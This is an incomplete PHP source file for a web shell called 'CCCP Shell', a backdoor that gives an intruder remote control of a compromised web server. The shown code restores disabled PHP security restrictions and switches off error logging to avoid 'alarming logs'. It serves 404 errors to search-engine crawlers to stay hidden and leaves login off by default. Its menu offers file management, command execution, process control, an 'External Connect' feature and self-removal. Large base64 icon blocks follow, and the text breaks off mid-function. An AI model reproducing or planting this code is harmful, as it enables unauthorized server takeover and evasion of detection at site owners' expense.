<?php
/*
 * CCCP Shell by DSR!
 * Version: 1.0 Build: 27102013
 */

$tiempoCarga = microtime(true);
$isWIN = DIRECTORY_SEPARATOR === '\\';
$isCOM = (class_exists('COM') ? 1 : 0);

# Restoring
ini_restore('safe_mode_include_dir');
ini_restore('safe_mode_exec_dir');
ini_restore('disable_functions');
ini_restore('allow_url_fopen');
ini_restore('safe_mode');
ini_restore('open_basedir');

# Extras 
if (function_exists('ini_set')) {
    @ini_set('error_log', null); // No alarming logs
    @ini_set('log_errors', 0);   // No logging of errors
    @ini_set('file_uploads', 1); // Enable file uploads
    @ini_set('allow_url_fopen', 1); // allow url fopen
} else { //Alias
    @ini_alter('error_log', null);
    @ini_alter('log_errors', 0);
    @ini_alter('file_uploads', 1);
    @ini_alter('allow_url_fopen', 1);
}

error_reporting(7);
@ini_set('memory_limit', '64M'); //for online zip usage
@set_magic_quotes_runtime(0);
@set_time_limit(0);
@ini_set('max_execution_time', 0);
//@ini_set('output_buffering', 0);

function s_array(&$array) {
	if (is_array($array)) {
		foreach ($array as $k => $v) {
			$array[$k] = s_array($v);
		}
	} else if (is_string($array)) {
		$array = stripslashes($array);
	}
	return $array;
}

foreach($_POST as $key => $value) {
	if (@get_magic_quotes_gpc()) $value = s_array($value);
	$key = $value;
}

if(!empty($_SERVER['HTTP_USER_AGENT'])) {
    $userAgents = array('Google', 'Slurp', 'MSNBot', 'ia_archiver', 'Yandex', 'Rambler');
    if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
        header('HTTP/1.0 404 Not Found');
        exit;
    }
}

# System variables
$config['Menu'] = 'menu';
$config['Action'] = 'act';
$config['Mode'] = 'mode';
$config['zName'] = False;      //md5('user'); // False = PHP_AUTH_USER login Off 
$config['zPass'] = False;      //md5('pass'); // False = login Off
$config['hexdump_lines'] = 16; //lines in hex preview file
$config['hexdump_rows'] = 32;  //16, 24 or 32 bytes in one line
$config['FMLimit'] = False;    //file manager item limit. False = No limit
if (@! $_POST[$config['Menu']]) $_POST[$config['Menu']] = 'file'; //default action

$content = '';
$js = '';

# language
$lang['fm'] = 'File Manager';
$lang['tools'] = 'Tools';
$lang['procs'] = 'Procs';
$lang['info'] = 'Info';
$lang['ec'] = 'External Connect';
$lang['sql'] = 'SQL';
$lang['exe'] = 'Execute';
$lang['update'] = 'Update';
$lang['sr'] = 'Self remove';
$lang['out'] = 'Logout';
//fm
$lang['of'] = 'of';
$lang['freespace'] = 'Free space';
$lang['acdir'] = 'Current directory';
$lang['go'] = 'Go!';
$lang['dd'] = 'Detected drives';
$lang['webroot'] = 'WebRoot';
$lang['vwdir'] = 'View Writable Directories';
$lang['vwfils'] = 'View Writable Files';
$lang['cdir'] = 'Create directory';
$lang['cfil'] = 'Create file';
$lang['writable'] = 'Writable';
$lang['name'] = 'Name';
$lang['date'] = 'Date';
$lang['size'] = 'Size';
$lang['action'] = 'Action';
$lang['selected'] = 'Selected';
$lang['download'] = 'Download';
$lang['del'] = 'Delete';
$lang['copy'] = 'Copy';
$lang['dirs'] = 'Directories';
$lang['fils'] = 'Files';
//misc
$lang['yes'] = 'Yes';
$lang['no'] = 'No';
$lang['merror'] = 'Are you sure?';


# Images - http://www.famfamfam.com + http://www.base64-image.de
$img = array(
	'info' => '<img src="data:image/gif;base64,R0lGODlhEAAQAPcAAPb4+6fB48DY98fW6+ju9vX4/DdppTprpzpspzxtqD9wqkBwq0Z1rk58s1eDuFuHu2GMv2OLu2OKuWqSw2yVxWWKtneg0HiezISn04+w2ZGz25m54J++46PB5p6736zI65y107PO77nT87jS8qa92b7X9r3W9bzV9KrA2rrO5rnM5MLU6sXW6s3c78nY6tbk9dzp+d3o9tzn9drl89nk8trl8t/q9+Pr9ezx91+Jt2SPvmKMumaQv2WPvmKKuGyYx2GHsmOJtXGdzHKezWuUwG2VwmeOuHWgz3GZx22VwH6o1X6m0Yas14mu2IChxYany5W12Zy73ZSwz6O7167I5LTL5LrN47rM4MPV6sbY7MDR5NTj9NDe7tXi8dnl89bi8N3p9uPs9meTwWmWxGmVw2iUwmyax2qXxGuYxWuYxHGbxXun0nql0Xukz4Gs14Go0YWmyZG01pq73KG92bbM4r/T57vO4r/S5b7Q48TV58jY6NLg7tPh79nm8+Hq8+rw9u7z+PL2+vX4+2uZxb/T5cra6eLs9czc6tXj79Hg7P///wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAEAAIoALAAAAAAQABAAQAjEABUJHEiwoMAMNNgMOjMmkJ8iPXQkQQRhYAgwWdzICWOIypoUXTQUfJDnDhwjFZxcwbPAoCITMGLMmCHjxYeCHbx4ODLkRpU6AAilibPnwkAVLJDw4IHjT44cQeyQcKlIQYIDBqgSFFDihAitI2xwCdCESZQBfTgU3NJCiQVBBQoIetMGy4qBG2osEWIGDR1ABOaUUfOFgkAMfKD8ICNmaQQJPp4ccjBwggsrRHZIkZIDCAotDAw2mFIoUSI9IBBoXa0oIAA7" />',
	'edit' => '<img src="data:image/gif;base64,R0lGODlhEAAQAPcAACpgtyxity5kuS9lujBlujFmu9Xl/s3S2i1kuS5luTBmujFnuzNpvGWU29fn/jZvvzhxvzt2xNbn/tfo/tbn/djo/vj7//T3+zt2wTx4wT98xUB8xMng+8/j/NHk/NTm/dbo/tXn/dTm/M3W4fP3/PD0+UKAxkKAxUWCxkWCxUeExmCFrbrW9cHb+MLc+MTd+cjg+8nh+8rh+svi+83j/M3j+8/k/M7j+9Dk+9Pn/dPm/EmIxkqIxkmFxEuJxkuIxU2LyEyJxk+MyU+MyE+Lx7jW9MXf+cjh+8fg+sni+8jg+cjV4t7q9uPt9+ry+urx+Ozy+O/0+fT4/PL2+vH1+ff6/UuJxU+NyH2y4tzq9t/s997r9t/r9evz+uzz+evy+O3z+Ozy92e9/Nfm8ujx+PL3+/X5/E+y91Gy91W0+GG8+2K8/GK9/GO9+2S+/GW++2i//W7C/ebw9+30+e70+Pj7/WC+/GWo0pPU/5TV/5XW/5rJ4+30+P3+/sLLttDUvsnNr9XWvf32wv32xP33x/fhWvfiW/XfW/jiXfXcXvXcX/ffY+TJVfbdbPHjr8zGsPLWevDTee3QePHUe+7Tee7Ufe7VgczGs+fLd+3Kbda5drOfcPnjsldCGIJmLqqJQ9W2esWYSee+d7+2ptCdRodhK9ilWNG3kL56GufAi+/SrP/y4Onf0tqYSduZS+ChUdmbUcKMSLyJTNejY8eMSNiaVNOfZsiZZPnJkf/z5aZoJsmFQfnHlNuxhfbTrvDStPzgxP///wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAEAAMEALAAAAAAQABAAQAj/AIMFAzKk4JArQohYiSCwoQovICZc0iRoEaJIrZY4MSHQB5UOOGzQkPECkCVOqXwBsxUsQ5M4nUrJ2rRHTx48by4sEPhjCpIYSWAYaVHEgh9TvUgJ5BHFAYUQHwJRIqTIEKRXKwSeIGPg06paqELFOsDhSBUMAhk80bKFSZYsXbo4ISGlDwCBPcLQ4QOmL5QwY7A0aBgsCBUaN2rMUOKChSNRv3KpohXMRwkdInJ4qPGn0qBGmWbdErhjToUKEx5hIpSo0CRXrFAITPFFwihQpxgdkgRrRIwyGgRukJPGEy9cu3TdQXPmjJkHAiFwgSPmjRs3bNqosbOmDoKGBAooDBhPYECCBAIEBBAYEAA7" />',
	'download' => '<img src="data:image/gif;base64,R0lGODlhEAAQAPcAAP39/m6K12yN3HCP4W2L2myLzWiL03uc3YWi3Zq27+vx/fn7//v8/vr7/Vd+u2CJyWWNzGiOzWmQzXmf23mc1Ze26pm46qG/77rO7y5fpjNlsT5qq0RwsERtq1F/w1WDxlSBxFN/wViEw1uGx12IyGGLyWGKx12Ev2KLyGWNym6X1HOa1G6TzHGY0Hee2XOZ0Xmg2Xie2Hif2Huh3Hqg2X2j3nyj23Wa0H6l3YGn4oGn4YCm3Xue1IWo3YKk1oyv5KG/6ufw/fD2//r8/zppqnCg4JK15qLH957A77DN87PH47PG3zFbkGqb12+e2HGd0nul2a3P96O61sDa+dDj+9vq/dvq/NPf7uXw/TZkmTlpnlqPy1mFtG2QuIyu1YWkx8Hc+cLc+cXe+cff+crh+s3i+tPm+9Ll+sPU59jp/N/t/eHt++71/TxvpFKGuVaGt7za+b/c+r/c+b/b+MLe+sDa9Mfg+sri+szj+9Dl+tXp/eLv/OTw/PH4//D2/Pf7//f6/fv9//3+//z9/vv8/UuFuaXK67LQ7b3c+b/c+MHZ8NXp+9Pm+Njr/djn9eLw/eTx/erz+06OxEuIvVKUyozA6prG66bL6cbf9cHZ7lWa0Fif1Vuk2m2y5ne36IG86oe43/T5/ff7/l+s4l2o3miw5Nnr+PH4/fn8/vr8/erz8/3///3+/ubw7+bx7+318+Xx7ebx7ejz6un05IS/VIS/UZjJb5nJccfujMfuh9f2otf0ov//3f//4P///////wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAEAAL8ALAAAAAAQABAAQAj/AH8JHPXJU6dSoxIqFCiwkCgwiUYg8cXCl68/fX6YEKjpkBAyeKiYWZTGyqonmTT90sIFipMmICqoiuWqFaxXFDgI5GTJ154gCticAjTEl6g6nARKcnQGjgoeLXxEkHDjBQqGb1jRiZPCAo4dNmjAkBHjxK8uUpagufIBA69cu3Th6oVgA8NKFi2GimSKEaZLpBhuMhRIT6Mqah5B4uOryAJQAikpWjMljBg7d8rkEbSFEsNJfsYggpDEl5K8voA8EOgGlZw5JC6kYgBgUANCPUL8auMFy5EoJYzk0FFjxgQXKxxk+YLaQwJZtWzdojXrAJFfTLJn1yDCwAABBAIUBOiQISAAOw==" />',
	'search' => '<img src="data:image/gif;base64,R0lGODlhFAAUALMAAAAAAP///+rq6t3d3czMzMDAwLKysoaGhnd3d2ZmZl9fX01NTSkpKQQEBP///wAAACH5BAEAAA4ALAAAAAAUABQAAASn0Ml5qj0z5xr6+JZGeUZpHIqRNOIRfIYiy+a6vcOpHOaps5IKQccz8XgK4EGgQqWMvkrSscylhoaFVmuZLgUDAnZxEBMODSnrkhiSCZ4CGrUWMA+LLDxuSHsDAkN4C3sfBX10VHaBJ4QfA4eIU4pijQcFmCVoNkFlggcMRScNSUCdJyhoDasNZ5MTDVsXBwlviRmrCbq7C6sIrqawrKwTv68iyA6rDhEAOw==" />',
	'copy' => '<img src="data:image/gif;base64,R0lGODlhEAAQAMQAAHKQruzx9sfj/uXt9vL2+tXb5MHU4arT+7zd/YmwylVri5XK/IO76EhUaa/S5bPZ/Ha36VRie5/E2Ft6nt/o7ykxQ0FIVz1EVajL332hvNfn8HyjwI7B76HQ+////////yH5BAEAAB8ALAAAAAAQABAAAAWJ4CeOZCkajiMlGQCYoqMNQ0BzE+wMgoCqLBcJQxCkZrVbTiQpcnY9AYLAYShEiSKDGJ0SCNdPVsBo9hCIx4MQEW0CCMYY/TgcCA0RAA6Z1w8dA3kfAAQIEG90gIGDEwUEBntpgAsLFBZ6CgoRhZMdlQEXJo4ENBQUAQYVJgCaEQ0NFhcVbTC2HyEAOw==" />',
	'del' => '<img src="data:image/gif;base64,R0lGODlhEAAQAMQAAOt0dP94eOFjY/a0tP/JyfFfX/yVlf6mppNtbf5qanknJ9dVVeZqat5eXpiMjGo4OIUvL3pGRthWVuhvb1kaGv39/f1lZdg7O/7Y2F8/P+13d4tcXNRTU2dCQv///////yH5BAEAAB8ALAAAAAAQABAAAAVx4CeOZFlGToogkSluGEEcRg2ZsKYBwDQxgduog9HxfAyGIEAZDnge38UjWD6cvolnGqgmrqLOIMngVhuJZngs4Hoa8LSz6gnA32j1p2NY+P8LEhxyIxkaghyJiQkKJoYWBZEFFo0uDxAKmRB6Lp2enyEAOw==" />',
	'lnk' => '<img src="data:image/gif;base64,R0lGODlhEAAQAGYAACH5BAEAAFAALAAAAAAQABAAhgAAAABiAGPLMmXMM0y/JlfFLFS6K1rGLWjONSmuFTWzGkC5IG3TOo/1XE7AJx2oD5X7YoTqUYrwV3/lTHTaQXnfRmDGMYXrUjKQHwAMAGfNRHziUww5CAAqADOZGkasLXLYQghIBBN3DVG2NWnPRnDWRwBOAB5wFQBBAAA+AFG3NAk5BSGHEUqwMABkAAAgAAAwAABfADe0GxeLCxZcDEK6IUuxKFjFLE3AJ2HHMRKiCQWCAgBmABptDg+HCBZeDAqFBWDGMymUFQpWBj2fJhdvDQhOBC6XF3fdR0O6IR2ODwAZAHPZQCSREgASADaXHwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAeZgFBQPAGFhocAgoI7Og8JCgsEBQIWPQCJgkCOkJKUP5eYUD6PkZM5NKCKUDMyNTg3Agg2S5eqUEpJDgcDCAxMT06hgk26vAwUFUhDtYpCuwZByBMRRMyCRwMGRkUg0xIf1lAeBiEAGRgXEg0t4SwroCYlDRAn4SmpKCoQJC/hqVAuNGzg8E9RKBEjYBS0JShGh4UMoYASBiUQADs=" />',
	'dir' => '<img src="data:image/gif;base64,R0lGODlhEwAQALMAAAAAAP///5ycAM7OY///nP//zv/OnPf39////wAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAEAAAgALAAAAAATABAAAARREMlJq7046yp6BxsiHEVBEAKYCUPrDp7HlXRdEoMqCebp/4YchffzGQhH4YRYPB2DOlHPiKwqd1Pq8yrVVg3QYeH5RYK5rJfaFUUA3vB4fBIBADs=" />',
	'htaccess' => '<img src="data:image/gif;base64,R0lGODlhEAAQACIAACH5BAEAAAYALAAAAAAQABAAggAAAP8AAP8A/wAAgIAAgP//AAAAAAAAAAM6WEXW/k6RAGsjmFoYgNBbEwjDB25dGZzVCKgsR8LhSnprPQ406pafmkDwUumIvJBoRAAAlEuDEwpJAAA7" />',
	'asp' => '<img src="data:image/gif;base64,R0lGODdhEAAQALMAAAAAAIAAAACAAICAAAAAgIAAgACAgMDAwICAgP8AAAD/AP//AAAA//8A/wD//////ywAAAAAEAAQAAAESvDISasF2N6DMNAS8Bxfl1UiOZYe9aUwgpDTq6qP/IX0Oz7AXU/1eRgID6HPhzjSeLYdYabsDCWMZwhg3WWtKK4QrMHohCAS+hABADs=" />',
	'cgi' => '<img src="data:image/gif;base64,R0lGODlhEAAQAGYAACH5BAEAAEwALAAAAAAQABAAhgAAAJtqCHd3d7iNGa+HMu7er9GiC6+IOOu9DkJAPqyFQql/N/Dlhsyyfe67Af/SFP/8kf/9lD9ETv/PCv/cQ//eNv/XIf/ZKP/RDv/bLf/cMah6LPPYRvzgR+vgx7yVMv/lUv/mTv/fOf/MAv/mcf/NA//qif/MAP/TFf/xp7uZVf/WIP/OBqt/Hv/SEv/hP+7OOP/WHv/wbHNfP4VzV7uPFv/pV//rXf/ycf/zdv/0eUNJWENKWsykIk9RWMytP//4iEpQXv/9qfbptP/uZ93GiNq6XWpRJ//iQv7wsquEQv/jRAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAeegEyCg0wBhIeHAYqIjAEwhoyEAQQXBJCRhQMuA5eSiooGIwafi4UMBagNFBMcDR4FQwwBAgEGSBBEFSwxNhAyGg6WAkwCBAgvFiUiOBEgNUc7w4ICND8PKCFAOi0JPNKDAkUnGTkRNwMS34MBJBgdRkJLCD7qggEPKxsJKiYTBweJkjhQkk7AhxQ9FqgLMGBGkG8KFCg8JKAiRYtMAgEAOw==" />',
	'php' => '<img src="data:image/gif;base64,R0lGODlhEAAQAAAAACH5BAEAAAEALAAAAAAQABAAgAAAAAAAAAImDA6hy5rW0HGosffsdTpqvFlgt0hkyZ3Q6qloZ7JimomVEb+uXAAAOw==" />',
	'html' => '<img src="data:image/gif;base64,R0lGODlhEwAQALMAAAAAAP///2trnM3P/FBVhrPO9l6Itoyt0yhgk+Xy/WGp4sXl/i6Z4mfd/HNzc////yH5BAEAAA8ALAAAAAATABAAAAST8Ml3qq1m6nmC/4GhbFoXJEO1CANDSociGkbACHi20U3PKIFGIjAQODSiBWO5NAxRRmTggDgkmM7E6iipHZYKBVNQSBSikukSwW4jymcupYFgIBqL/MK8KBDkBkx2BXWDfX8TDDaFDA0KBAd9fnIKHXYIBJgHBQOHcg+VCikVA5wLpYgbBKurDqysnxMOs7S1sxIRADs=" />',
	'jpg' => '<img src="data:image/gif;base64,R0lGODlhEAAQADMAACH5BAEAAAkALAAAAAAQABAAgwAAAP///8DAwICAgICAAP8AAAD/AIAAAACAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAARccMhJk70j6K3FuFbGbULwJcUhjgHgAkUqEgJNEEAgxEciCi8ALsALaXCGJK5o1AGSBsIAcABgjgCEwAMEXp0BBMLl/A6x5WZtPfQ2g6+0j8Vx+7b4/NZqgftdFxEAOw==" />',
	'js' => '<img src="data:image/gif;base64,R0lGODdhEAAQACIAACwAAAAAEAAQAIL///8AAACAgIDAwMD//wCAgAAAAAAAAAADUCi63CEgxibHk0AQsG200AQUJBgAoMihj5dmIxnMJxtqq1ddE0EWOhsG16m9MooAiSWEmTiuC4Tw2BB0L8FgIAhsa00AjYYBbc/o9HjNniUAADs=" />',
	'swf' => '<img src="data:image/gif;base64,R0lGODlhFAAUAMQRAP+cnP9SUs4AAP+cAP/OAIQAAP9jAM5jnM6cY86cnKXO98bexpwAAP8xAP/OnAAAAP///////wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAEAABEALAAAAAAUABQAAAV7YCSOZGme6PmsbMuqUCzP0APLzhAbuPnQAweE52g0fDKCMGgoOm4QB4GAGBgaT2gMQYgVjUfST3YoFGKBRgBqPjgYDEFxXRpDGEIA4xAQQNR1NHoMEAACABFhIz8rCncMAGgCNysLkDOTSCsJNDJanTUqLqM2KaanqBEhADs=" />',
	'tar' => '<img src="data:image/gif;base64,R0lGODlhEAAQAGYAACH5BAEAAEsALAAAAAAQABAAhgAAABlOAFgdAFAAAIYCUwA8ZwA8Z9DY4JICWv///wCIWBE2AAAyUJicqISHl4CAAPD4/+Dg8PX6/5OXpL7H0+/2/aGmsTIyMtTc5P//sfL5/8XFHgBYpwBUlgBWn1BQAG8aIABQhRbfmwDckv+H11nouELlrizipf+V3nPA/40CUzmm/wA4XhVDAAGDUyWd/0it/1u1/3NzAP950P990mO5/7v14YzvzXLrwoXI/5vS/7Dk/wBXov9syvRjwOhatQCHV17puo0GUQBWnP++8Lm5AP+j5QBUlACKWgA4bjJQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAeegAKCg4SFSxYNEw4gMgSOj48DFAcHEUIZREYoJDQzPT4/AwcQCQkgGwipqqkqAxIaFRgXDwO1trcAubq7vIeJDiwhBcPExAyTlSEZOzo5KTUxMCsvDKOlSRscHDweHkMdHUcMr7GzBufo6Ay87Lu+ii0fAfP09AvIER8ZNjc4QSUmTogYscBaAiVFkChYyBCIiwXkZD2oR3FBu4tLAgEAOw==" />',
	'mp3' => '<img src="data:image/gif;base64,R0lGODlhEAAQACIAACH5BAEAAAYALAAAAAAQABAAggAAAP///4CAgMDAwICAAP//AAAAAAAAAANUaGrS7iuKQGsYIqpp6QiZRDQWYAILQQSA2g2o4QoASHGwvBbAN3GX1qXA+r1aBQHRZHMEDSYCz3fcIGtGT8wAUwltzwWNWRV3LDnxYM1ub6GneDwBADs=" />',
	'avi' => '<img src="data:image/gif;base64,R0lGODlhEAAQACIAACH5BAEAAAUALAAAAAAQABAAggAAAP///4CAgMDAwP8AAAAAAAAAAAAAAANMWFrS7iuKQGsYIqpp6QiZ1FFACYijB4RMqjbY01DwWg44gAsrP5QFk24HuOhODJwSU/IhBYTcjxe4PYXCyg+V2i44XeRmSfYqsGhAAgA7" />',
	'cmd' => '<img src="data:image/gif;base64,R0lGODlhEAAQACIAACH5BAEAAAcALAAAAAAQABAAggAAAP///4CAgMDAwAAAgICAAP//AAAAAANIeLrcJzDKCYe9+AogBvlg+G2dSAQAipID5XJDIM+0zNJFkdL3DBg6HmxWMEAAhVlPBhgYdrYhDQCNdmrYAMn1onq/YKpjvEgAADs=" />',
	'cpp' => '<img src="data:image/gif;base64,R0lGODlhEAAQACIAACH5BAEAAAUALAAAAAAQABAAgv///wAAAAAAgICAgMDAwAAAAAAAAAAAAANCWLPc9XCASScZ8MlKicobBwRkEIkVYWqT4FICoJ5v7c6s3cqrArwinE/349FiNoFw44rtlqhOL4RaEq7YrLDE7a4SADs=" />',
	'ini' => '<img src="data:image/gif;base64,R0lGODlhEAAQACIAACH5BAEAAAYALAAAAAAQABAAggAAAP///8DAwICAgICAAP//AAAAAAAAAANLaArB3ioaNkK9MNbHs6lBKIoCoI1oUJ4N4DCqqYBpuM6hq8P3hwoEgU3mawELBEaPFiAUAMgYy3VMSnEjgPVarHEHgrB43JvszsQEADs= " />',
	'doc' => '<img src="data:image/gif;base64,R0lGODlhEAAQACIAACH5BAEAAAUALAAAAAAQABAAggAAAP///8DAwAAA/4CAgAAAAAAAAAAAAANRWErcrrCQQCslQA2wOwdXkIFWNVBA+nme4AZCuolnRwkwF9QgEOPAFG21A+Z4sQHO94r1eJRTJVmqMIOrrPSWWZRcza6kaolBCOB0WoxRud0JADs=" />',
	'exe' => '<img src="data:image/gif;base64,R0lGODlhEwAOAKIAAAAAAP///wAAvcbGxoSEhP///wAAAAAAACH5BAEAAAUALAAAAAATAA4AAAM7WLTcTiWSQautBEQ1hP+gl21TKAQAio7S8LxaG8x0PbOcrQf4tNu9wa8WHNKKRl4sl+y9YBuAdEqtxhIAOw==" />',
	'log' => '<img src="data:image/gif;base64,R0lGODlhEAAQADMAACH5BAEAAAgALAAAAAAQABAAg////wAAAMDAwICAgICAAAAAgAAA////AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAARQEKEwK6UyBzC475gEAltJklLRAWzbClRhrK4Ly5yg7/wNzLUaLGBQBV2EgFLV4xEOSSWt9gQQBpRpqxoVNaPKkFb5Eh/LmUGzF5qE3+EMIgIAOw==" />',
	'pl' => '<img src="data:image/gif;base64,R0lGODlhFAAUAKL/AP/4/8DAwH9/AP/4AL+/vwAAAAAAAAAAACH5BAEAAAEALAAAAAAUABQAQAMoGLrc3gOAMYR4OOudreegRlBWSJ1lqK5s64LjWF3cQMjpJpDf6//ABAA7" />',
	'txt' => '<img src="data:image/gif;base64,R0lGODlhEwAQAKIAAAAAAP///8bGxoSEhP///wAAAAAAAAAAACH5BAEAAAQALAAAAAATABAAAANJSArE3lDJFka91rKpA/DgJ3JBaZ6lsCkW6qqkB4jzF8BS6544W9ZAW4+g26VWxF9wdowZmznlEup7UpPWG3Ig6Hq/XmRjuZwkAAA7" />',
	'xml' => '<img src="data:image/gif;base64,R0lGODlhEAAQAEQAACH5BAEAABAALAAAAAAQABAAhP///wAAAPHx8YaGhjNmmabK8AAAmQAAgACAgDOZADNm/zOZ/zP//8DAwDPM/wAA/wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAVk4CCOpAid0ACsbNsMqNquAiA0AJzSdl8HwMBOUKghEApbESBUFQwABICxOAAMxebThmA4EocatgnYKhaJhxUrIBNrh7jyt/PZa+0hYc/n02V4dzZufYV/PIGJboKBQkGPkEEQIQA7" />',
	'unk' => '<img src="data:image/gif;base64,R0lGODlhEAAQAHcAACH5BAEAAJUALAAAAAAQABAAhwAAAIep3BE9mllic3B5iVpjdMvh/MLc+y1Up9Pm/GVufc7j/MzV/9Xm/EOm99bn/Njp/a7Q+tTm/LHS+eXw/t3r/Nnp/djo/Nrq/fj7/9vq/Nfo/Mbe+8rh/Mng+7jW+rvY+r7Z+7XR9dDk/NHk/NLl/LTU+rnX+8zi/LbV++fx/e72/vH3/vL4/u31/e31/uDu/dzr/Orz/eHu/fX6/vH4/v////v+/3ez6vf7//T5/kGS4Pv9/7XV+rHT+r/b+rza+vP4/uz0/urz/u71/uvz/dTn/M/k/N3s/dvr/cjg+8Pd+8Hc+sff+8Te+/D2/rXI8rHF8brM87fJ8nmPwr3N86/D8KvB8F9neEFotEBntENptENptSxUpx1IoDlfrTRcrZeeyZacxpmhzIuRtpWZxIuOuKqz9ZOWwX6Is3WIu5im07rJ9J2t2Zek0m57rpqo1nKCtUVrtYir3vf6/46v4Yuu4WZvfr7P6sPS6sDQ66XB6cjZ8a/K79/s/dbn/ezz/czd9mN0jKTB6ai/76W97niXz2GCwV6AwUdstXyVyGSDwnmYz4io24Oi1a3B45Sy4ae944Ccz4Sj1n2GlgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAjnACtVCkCw4JxJAQQqFBjAxo0MNGqsABQAh6CFA3nk0MHiRREVDhzsoLQwAJ0gT4ToecSHAYMzaQgoDNCCSB4EAnImCiSBjUyGLobgXBTpkAA5I6pgmSkDz5cuMSz8yWlAyoCZFGb4SQKhASMBXJpMuSrQEQwkGjYkQCTAy6AlUMhWklQBw4MEhgSA6XPgRxS5ii40KLFgi4BGTEKAsCKXihESCzrsgSQCyIkUV+SqOYLCA4csAup86OGDkNw4BpQ4OaBFgB0TEyIUKqDwTRs4a9yMCSOmDBoyZu4sJKCgwIDjyAsokBkQADs=" />'
);

function showIcon($image) {
    global $img;
    $image = strtolower(substr(strrchr($image, '.'), 1));

    $imgEquals = array(
      'tar' => array('tar', 'r00', 'ace', 'arj', 'bz', 'bz2', 'tbz', 'tbz2', 'tgz', 'uu', 'xxe', 'zip', 'cab', 'gz', 'iso', 'lha', 'lzh', 'pbk', 'rar', 'uuf'), 
      'php' => array('php', 'php3', 'php4', 'php5', 'phtml', 'shtml'), 
      'jpg' => array('jpg', 'gif', 'png', 'jpeg', 'jfif', 'jpe', 'bmp', 'ico', 'tif', 'tiff'), 
      'html'=> array('html', 'htm'), 
      'avi' => array('avi', 'mov', 'mvi', 'mpg', 'mpeg', 'wmv', 'rm'), 
      'lnk' => array('lnk', 'url'), 
      'ini' => array('ini', 'css', 'inf'), 
      'doc' => array('doc', 'dot'), 
      'js'  => array('js', 'vbs'), 
      'cmd' => array('cmd', 'bat', 'pif'), 
      'wri' => array('wri', 'rtf'), 
      'swf' => array('swf', 'fla'), 
      'mp3' => array('mp3', 'au', 'midi', 'mid'), 
      'htaccess' => array('htaccess', 'htpasswd', 'ht', 'hta', 'so') 
	);

    foreach ($imgEquals as $k => $v) {
        if (in_array($image, $v)) {
            $image = $k;
